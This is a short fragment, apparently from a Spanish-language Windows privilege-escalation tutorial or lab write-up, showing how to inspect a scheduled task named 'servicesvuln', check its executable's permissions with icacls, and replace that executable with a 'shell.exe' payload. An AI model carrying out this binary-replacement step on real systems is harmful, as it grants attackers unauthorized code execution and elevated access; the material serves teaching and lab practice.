...
# Detalles específicos
schtasks /query /tn "servicesvuln" /fo list /v
...
# Ejemplo:
# Task To Run:        C:\Users\admin\Desktop\servicesvuln.exe
# Run As User:        admin
```
...
```powershell
icacls C:\Users\admin\Desktop\servicesvuln.exe
...
move shell.exe "C:\Users\admin\Desktop\servicesvuln.exe"
```
